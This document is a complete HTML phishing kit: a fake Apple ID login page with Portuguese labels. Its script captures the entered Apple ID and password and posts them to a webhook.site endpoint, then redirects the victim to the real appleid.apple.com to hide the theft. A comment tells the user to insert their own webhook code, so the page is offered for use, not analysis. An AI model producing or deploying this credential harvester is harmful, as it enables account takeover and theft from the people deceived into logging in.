<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Apple ID - Login</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #f2f2f7; margin: 0; padding: 20px; display: flex; justify-content: center; }
        .login-box { background: white; padding: 30px; border-radius: 12px; width: 300px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; }
        button { width: 100%; background: #0071e3; color: white; border: none; padding: 12px; border-radius: 8px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo"></div>
        <h2>Fazer login</h2>
        <form id="loginForm">
            <input type="text" placeholder="Apple ID" name="apple_id" required>
            <input type="password" placeholder="Senha" name="password" required>
            <button type="submit">Continuar</button>
        </form>
    </div>

    <script>
        document.getElementById("loginForm").onsubmit = async function(e) {
            e.preventDefault();
            
            const data = {
                user: document.getElementsByName("apple_id")[0].value,
                pass: document.getElementsByName("password")[0].value,
                time: new Date().toLocaleString()
            };

            // Envia os dados (substitua SEU-CODIGO pelo seu código do webhook)
            await fetch('https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            // Redireciona para o site oficial
            window.location.href = "https://appleid.apple.com/";
        };
    </script>
</body>
</html>
